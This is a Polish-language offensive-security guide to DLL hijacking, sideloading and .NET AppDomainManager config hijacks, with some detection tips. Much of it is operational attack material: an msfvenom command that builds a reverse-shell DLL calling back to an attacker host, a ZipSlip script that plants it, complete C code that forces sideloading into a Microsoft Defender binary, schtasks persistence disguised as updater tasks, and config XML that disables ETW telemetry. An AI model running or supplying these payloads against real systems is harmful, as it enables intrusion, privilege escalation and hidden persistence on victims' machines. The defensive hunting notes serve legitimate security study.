# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na nakłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Wykorzystuje się go głównie do wykonywania kodu i zapewniania trwałości, a rzadziej do eskalacji uprawnień. Mimo że tutaj skupiamy się na eskalacji, metoda przejęcia pozostaje taka sama niezależnie od celu.

### Typowe techniki

W DLL Hijacking stosuje się kilka metod, a ich skuteczność zależy od sposobu ładowania bibliotek DLL przez aplikację:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL złośliwą, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnej biblioteki.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce wyszukiwania poprzedzającej lokalizację oryginalnej biblioteki, wykorzystując kolejność przeszukiwania stosowaną przez aplikację.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, błędnie uznając ją za brakującą, wymaganą bibliotekę.
4. **DLL Redirection**: Zmiana parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL jej złośliwym odpowiednikiem w katalogu WinSxS; metoda ta często wiąże się z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu wraz ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

Aplikacja może również implementować **własny loader DLL**. Uprzywilejowany proces może wyliczać pliki w katalogu podrzędnym, takim jak `Libraries` lub `Plugins`, i przekazywać wybraną bibliotekę DLL do procesu pomocniczego, niezależnie od standardowej kolejności wyszukiwania bibliotek DLL w Windows. Jeśli inne konto może tworzyć pliki w tym konkretnym katalogu, potraktuj to jako trop do dalszej analizy: potwierdź tożsamość procesu, efektywne ACL katalogu, regułę wyboru pliku oraz możliwość wywołania operacji ładowania. Sam fakt, że katalog obok pliku wykonywalnego jest zapisywalny, nie dowodzi, że proces ładuje z niego biblioteki DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

W klasycznym side-loading zaufany plik PE pozostaje niezmieniony, a atak polega na przejęciu rozwiązywania nazw bibliotek DLL. **Import grafting** polega natomiast na modyfikacji pliku PE, który został już załadowany przez zaufany program. Atakujący dodaje deskryptor importu oraz powiązane z nim wpisy lookup/IAT dla kontrolowanej przez siebie biblioteki DLL. Gdy Windows rekurencyjnie rozwiązuje tę zależność, mapuje dodaną bibliotekę DLL i uruchamia jej kod inicjalizacyjny wewnątrz poza tym legalnego procesu. Jest to modyfikacja pliku PE na dysku, a nie ta sama operacja co zastąpienie wskaźnika funkcji w działającej tablicy IAT za pomocą hooka czasu wykonania.<sup>[[31]](#references)[[32]](#references)</sup>

Zmodyfikowanym plikiem PE może być pośrednia biblioteka DLL dostawcy, a nie plik wykonywalny uruchamiany przez użytkownika lub Task Scheduler. Przykładowy łańcuch możliwy do wielokrotnego wykorzystania:<sup>[[32]](#references)</sup>

1. Skopiuj oryginalny plik wykonywalny i jego zależności do katalogu kontrolowanego przez atakującego.
2. Zmodyfikuj struktury importu jednej z zależności, aby wskazywały złośliwą bibliotekę DLL, zachowując jednocześnie oczekiwane eksporty i normalne działanie zależności.
3. Skonfiguruj autorun lub zaplanowane zadanie, aby uruchamiało oryginalny plik wykonywalny. Loader mapuje zmodyfikowaną zależność, a następnie nowo zaimportowaną bibliotekę DLL. Zobacz [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks), aby dowiedzieć się, jak wyszukiwać zadania.
4. Nie umieszczaj czasochłonnych operacji w `DllMain`; zaobserwowany loader utworzył wątek roboczy i kontynuował tam etapowe odszyfrowywanie.

Różni się to od przejęcia łańcucha dostaw po stronie dostawcy, ponieważ pakiet dostawcy jest czysty, a modyfikacja importu następuje po instalacji. Analizuj każdy moduł w katalogu stagingowym, a nie tylko host EXE: porównaj listy importów zależności i ich hashe z prawidłową instalacją, zweryfikuj podpisy i sprawdź pliki binarne dostawcy uruchamiane z nieoczekiwanych, zapisywalnych lokalizacji, takich jak `C:\ProgramData`. Zaplanowane zadanie wskazujące skopiowany crash reporter lub updater w takim katalogu może być szczególnie przydatnym punktem wyjścia do dalszej analizy.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczne DLL sideloading to nie jedyny sposób na skłonienie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **zarządzaną**, CLR sprawdza również **plik konfiguracyjny aplikacji** o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). W tym pliku można zdefiniować niestandardowy **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowany przez atakującego zestaw umieszczony obok pliku EXE, CLR załaduje go **przed standardową ścieżką wykonywania aplikacji** i uruchomi wewnątrz zaufanego procesu.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, aby użyć niestandardowego managera, muszą być obecne zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>`.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalny menedżer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktyczne uwagi:
- Ta technika dotyczy **wyłącznie .NET Framework**. Zależy od parsowania konfiguracji CLR, a nie od kolejności wyszukiwania DLL w Win32.
- Host musi być rzeczywiście **zarządzanym plikiem EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie **nagłówka CLR Runtime** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`) i zwykle znajduje się **obok pliku EXE**.
- Ta technika jest przydatna w przypadku **podpisanych plików binarnych Microsoftu lub dostawców**, ponieważ zaufany plik EXE pozostaje nietknięty, a złośliwe zarządzane zestawienie jest wykonywane w procesie.
- Jeśli masz już zapisywalny katalog instalatora/aktualizacji, AppDomainManager hijacking może posłużyć jako **pierwszy etap**, po którym nastąpi klasyczne DLL sideloading lub ładowanie refleksyjne w kolejnych etapach.

### Podpisany typ AppDomainManager jako gadżet w pliku konfiguracyjnym

Opisany wyżej typowy config hijack AppDomainManager wskazuje na zestawienie atakującego. Inna ścieżka w .NET Framework wykorzystuje **podpisane zestawienie**, umieszczone obok hosta lub w innym miejscu dostępnym dla mechanizmu rozpoznawania, którego typ managera odczytuje kontrolowane przez atakującego dane pomocnicze. Atakujący nadal musi mieć kontrolę nad sąsiadującym z zarządzanym hostem plikiem `.exe.config` oraz plikami dodatkowymi; podpis wybranego zestawienia nie sprawia, że jego dane konfiguracyjne są bezpieczne. Mechanizm konfiguracji to standardowe zachowanie AppDomainManager, natomiast opisana poniżej kaskada z użyciem podpisanego typu została zaobserwowana podczas analizy NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

W tej kaskadzie konfiguracja wybiera `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` z `Microsoft.HostIntegration.Connectors`. Podczas inicjalizacji wyszukiwany jest plik `fabric.config` w katalogu aplikacji. Wpis `customType` wskazuje `System.Resources.ResXResourceSet` i przekazuje `Resources.resx` jako argument konstruktora, co prowadzi do parsera zasobów bez konieczności dostarczania utworzonej przez atakującego biblioteki DLL managera. Wymaga to, aby powiązane z AppFabric podpisane zestawienie oraz wskazane klasy frameworka były dostępne dla mechanizmu rozpoznawania na atakowanym systemie; nie jest to uniwersalna właściwość dowolnego zarządzanego pliku EXE.<sup>[[35]](#references)</sup> Skonfigurowany AppDomainManager wymaga również aplikacji z pełnym zaufaniem; w przeciwnym razie CLR zgłosi `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Zawartość `Resources.resx` jest miejscem deserializacji, a nie tylko plikiem danych; zobacz [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). W opisywanym etapie loader XAML wyprowadzał również klucz AES z hasha SHA-256 **pełnego wiersza poleceń hosta zamienionego na małe litery** i używał pierwszych 16 bajtów zdekodowanego blobu jako IV. Odtworzenie działania plików z innym wierszem poleceń powoduje więc niepowodzenie deszyfrowania, zanim zostanie załadowany kolejny XAML.<sup>[[35]](#references)</sup>

### AppDomainManager jako downloader + bootstrapper zaplanowanego zadania

Praktyczny wzorzec włamania polega na połączeniu zaufanego zarządzanego pliku EXE ze złośliwym plikiem `*.config` i złośliwą biblioteką DLL AppDomainManager, która działa wyłącznie jako **niewielki bootstrapper**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub aktualizator .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiadujący plik config powoduje załadowanie przez CLR assembly atakującego **przed rozpoczęciem działania logiki legalnej aplikacji**.
3. Złośliwy manager wykonuje **kontrolę ścieżki** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE jest uruchomiony z `Downloads`, a drugi etap działa z `%LOCALAPPDATA%`).
4. Jeśli kontrola się powiedzie, pobiera właściwy payload do ścieżki zapisywalnej przez użytkownika, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia persystencję za pomocą zaplanowanego zadania.

Dlaczego ten wariant ma znaczenie:
- Podpisany host EXE pozostaje niezmieniony, więc analiza triage, która sprawdza tylko hash głównego pliku binarnego, może nie wykryć włamania.
- Prosta **analiza antyanalityczna oparta na ścieżce** jest powszechna: przeniesienie zestawu ZIP/EXE/DLL na Pulpit, do Temp lub do ścieżki sandboxa może celowo przerwać łańcuch.
- DLL AppDomainManager pierwszego etapu może pozostać niewielka i mało widoczna, podczas gdy właściwy implant jest pobierany później.

Minimalny przykład persystencji często spotykany w tym wzorcu:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny poziom** dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Tę technikę często lepiej sklasyfikować jako **wykonanie/persistence przez nadużycie konfiguracji .NET** niż klasyczny hijacking kolejności wyszukiwania brakującej biblioteki DLL, choć operatorzy często łączą obie techniki.

Wskazówki do wykrywania:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek po rozpakowaniu ZIP**, folderu `Downloads`, `%TEMP%` lub innych folderów z prawem zapisu dla użytkownika, wraz z **umieszczonym obok** plikiem `<exe>.config`.
- Nowe zaplanowane zadania, których akcje wskazują na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a których nazwy naśladują aktualizatory przeglądarek/dostawców.
- Krótkotrwałe zarządzane procesy bootstrapujące, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie przedwcześnie, jeśli ścieżka do pliku wykonywalnego nie pasuje do oczekiwanego katalogu profilu użytkownika.

### Hijacking istniejącego zaplanowanego zadania w celu ponownego uruchomienia łańcucha sideloadingu

W przypadku persistence nie szukaj wyłącznie **tworzenia nowego zadania**. Niektóre grupy intruzów czekają, aż legalny instalator utworzy **zwykłe zadanie aktualizatora**, a następnie **zmieniają akcję zadania**, tak aby istniejąca nazwa, autor i wyzwalacz nadal wyglądały znajomo dla osób broniących systemu.

Schemat działania do ponownego wykorzystania:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj zadanie, które zwykle tworzy.
2. Wyeksportuj plik XML zadania i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, tak aby zadanie uruchamiało **zaufany plik hosta EXE** z katalogu stagingowego z prawem zapisu dla użytkownika, który następnie wykonuje sideloading lub ładuje właściwy payload przez AppDomain.
4. Ponownie zarejestruj zadanie pod tą samą nazwą zamiast tworzyć nowy, oczywisty artefakt persistence.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Dlaczego jest to mniej widoczne:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jak nazwa programu aktualizującego dostawcy).
- Uruchamia je **usługa Harmonogram zadań**, więc weryfikacja procesu nadrzędnego i przodków często wykazuje oczekiwany łańcuch uruchamiania zadań zamiast `explorer.exe`.
- Zespoły DFIR, które szukają tylko **nowych nazw zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie sposoby wyszukiwania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj pliki XML w `C:\Windows\System32\Tasks\*` oraz metadane w `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z wartościami bazowymi.
- Generuj alerty, gdy zadanie aktualizatora **wyglądające na pochodzące od dostawcy** uruchamia się z **katalogów, w których użytkownik może zapisywać**, albo uruchamia plik .NET EXE z plikiem `*.config` w tym samym katalogu.

> [!TIP]
> Aby zobaczyć krok po kroku łańcuch, który łączy etapowanie HTML, konfiguracje AES-CTR i implanty .NET z DLL sideloading, zapoznaj się z poniższym przepływem pracy.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Powiązanie etapu załadowanego przez sideload z wierszem poleceń usługi

Załadowanie DLL przez sideload może wymagać czegoś więcej niż oczekiwanych nazw EXE hosta i DLL. Mandiant opisał loader, który wiąże odszyfrowanie payloadu z argumentem wiersza poleceń i nazwą pliku wykonywalnego hosta.<sup>[[33]](#references)</sup> W późniejszym łańcuchu wspieranym przez usługę skopiowany, legalny host załadował sąsiadujący plik `mscoree.dll`, który eksportował `LockClrVersion` i odszyfrowywał osadzony etap dopiero po wyprowadzeniu klucza AES-128 z argumentu usługi i nazwy bazowej pliku wykonywalnego hosta. Każde wejście skracano do 16 bajtów lub uzupełniano do tej długości bajtami NUL; klucz bajt po bajcie powstawał jako `argument XOR embedded_key XOR executable_basename`, a następnie payload odszyfrowywano za pomocą AES-CBC bez dopełniania. Zmiana nazwy hosta lub uruchomienie go bez oczekiwanego argumentu zmienia klucz i uniemożliwia odszyfrowanie tego etapu, nawet jeśli DLL nadal się ładuje. Odtwarzając lub analizując ten wariant, zachowaj dokładny argument wiersza poleceń i nazwę bazową.<sup>[[34]](#references)</sup>

Jest to **bramka payloadu nałożona na zwykły DLL sideloading**, a nie nowa reguła kolejności wyszukiwania DLL ani samodzielny prymityw eskalacji uprawnień. Poziom uprawnień wynika z kontekstu zabezpieczeń usługi. Przepływ pracy [GitHub issue/file C2](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) opisuje osobno późniejszy transport.<sup>[[34]](#references)</sup>

## Wyszukiwanie brakujących bibliotek DLL

Najczęstszym sposobem znajdowania brakujących bibliotek DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu Sysinternals i **ustawienie** **dwóch poniższych filtrów**:

![Typowe techniki - Wyszukiwanie brakujących bibliotek DLL: Najczęstszym sposobem znajdowania brakujących bibliotek DLL w systemie jest uruchomienie procmon z pakietu Sysinternals i ustawienie dwóch poniższych filtrów](<../../../images/image (961).png>)

![Typowe techniki - Wyszukiwanie brakujących bibliotek DLL: Najczęstszym sposobem znajdowania brakujących bibliotek DLL w systemie jest uruchomienie procmon z pakietu Sysinternals i ustawienie dwóch poniższych filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **aktywności systemu plików**:

![Typowe techniki - Wyszukiwanie brakujących bibliotek DLL: i wyświetlenie tylko aktywności systemu plików](<../../../images/image (153).png>)

Jeśli szukasz **ogólnie brakujących bibliotek DLL**, pozostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, na przykład **"Process Name" "contains" `<exec name>`**, uruchom program i zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystywanie brakujących bibliotek DLL

Aby eskalować uprawnienia, poszukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, w której możesz zapisywać. Może się tak zdarzyć, gdy kontrolujesz katalog przeszukiwany przed katalogiem zawierającym prawidłową DLL albo gdy żądana DLL nie istnieje i możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć szczegółowe informacje o sposobie ładowania bibliotek DLL.**

**Aplikacje Windows** szukają bibliotek DLL, korzystając z zestawu **z góry określonych ścieżek wyszukiwania** w określonej kolejności. Do DLL hijacking dochodzi, gdy szkodliwa DLL zostaje strategicznie umieszczona w jednym z tych katalogów, dzięki czemu jest ładowana przed oryginalną DLL. Aby temu zapobiec, należy zadbać o to, by aplikacja używała ścieżek bezwzględnych przy odwoływaniu się do wymaganych bibliotek DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie ma funkcji, która zwracałaby ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
   1. (_C:\Windows_)
5. Katalog bieżący.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Pamiętaj, że nie obejmuje to ścieżki dla aplikacji określonej w kluczu rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Gdy ta funkcja jest wyłączona, katalog bieżący przesuwa się na drugie miejsce. Aby ją wyłączyć, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpocznie się w katalogu modułu wykonywalnego, który ładuje funkcja **LoadLibraryEx**.

DLL można też załadować za pomocą ścieżki bezwzględnej zamiast nazwy. W takim przypadku Windows szuka samej DLL tylko pod tą ścieżką; zależności wskazane nazwą nadal podlegają odpowiedniej kolejności wyszukiwania.

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj omawiać.

### Połączenie dowolnego zapisu pliku z przejęciem brakującej DLL

**Powiązana technika:** [przełączanie punktu montowania sterowane przez oplock w ataku na uprzywilejowany proces naprawczy](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny działa **według harmonogramu lub jako usługa**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (pozycja nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem prawidłowej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym eksportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli dysponujesz prymitywem **dowolnego zapisu w stylu ZipSlip**, spreparuj plik ZIP, którego wpis wyjdzie poza katalog rozpakowywania, tak aby DLL trafiła do katalogu aplikacji:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Dostarcz archiwum do monitorowanej skrzynki odbiorczej/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą bibliotekę DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania bibliotek DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając kontrolowany przez atakującego katalog, można wymusić, aby proces docelowy, który rozpoznaje importowaną bibliotekę DLL po nazwie (bez ścieżki bezwzględnej i bez użycia bezpiecznych flag ładowania), załadował złośliwą bibliotekę DLL z tego katalogu.

Kluczowa idea
- Utwórz parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowe DllPath wskazujące na kontrolowany przez Ciebie folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny docelowego procesu będzie rozpoznawać bibliotekę DLL po nazwie, loader uwzględni podane DllPath podczas wyszukiwania, co umożliwi niezawodny sideloading, nawet jeśli złośliwa biblioteka DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się to od SetDllDirectory, które wpływa tylko na bieżący proces.
- Proces docelowy musi importować bibliotekę DLL lub wywoływać LoadLibrary, podając jej nazwę (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Nie można przejąć KnownDLLs ani ścieżek bezwzględnych zapisanych na stałe. Eksporty przekazywane dalej i SxS mogą zmienić kolejność wyszukiwania.

Minimalny przykład C (ntdll, ciągi znaków wide, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład C: wymuszanie sideloadingu DLL przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Przykład użycia operacyjnego
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje lub proxy do prawdziwej biblioteki) w katalogu DllPath.
- Uruchom podpisany plik binarny, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, używając powyższej techniki. Loader rozwiąże import za pomocą podanego DllPath i przeprowadzi sideloading Twojej biblioteki DLL.

Zaobserwowano, że technika ta jest wykorzystywana w rzeczywistych atakach do tworzenia wieloetapowych łańcuchów sideloadingu: początkowy launcher umieszcza pomocniczą bibliotekę DLL, która następnie uruchamia podpisany przez Microsoft, podatny na hijacking plik binarny z niestandardowym DllPath, aby wymusić załadowanie biblioteki DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### Hijacking AppDomainManager w .NET przez `.exe.config`

W przypadku celów **.NET Framework** sideloading można przeprowadzić **przed `Main()`** bez modyfikowania pamięci, wykorzystując sąsiadujący z aplikacją plik **`.exe.config`**. Zamiast polegać wyłącznie na kolejności wyszukiwania bibliotek DLL Win32, atakujący umieszcza legalny plik EXE .NET obok złośliwego pliku konfiguracyjnego i co najmniej jednego zestawu kontrolowanego przez atakującego.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Uruchamia się host EXE, a **CLR odczytuje `<exe>.config`**.
2. Konfiguracja ustawia **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, aby środowisko wykonawcze utworzyło kontrolowany przez atakującego `AppDomainManager`.
3. Złośliwy manager uzyskuje **możliwość wykonania kodu przed `Main()`** w zaufanym procesie hosta.
4. Ta sama konfiguracja może wymusić, aby CLR najpierw rozwiązywał odwołania do lokalnych zestawów (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację środowiska wykonawczego i telemetrię bez patchowania inline.

Wzorzec w stylu kampanii (dokładne zagnieżdżenie może się różnić zależnie od dyrektywy / wersji CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** ogranicza rozwiązywanie zestawów do katalogu aplikacji, zmieniając ten katalog w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
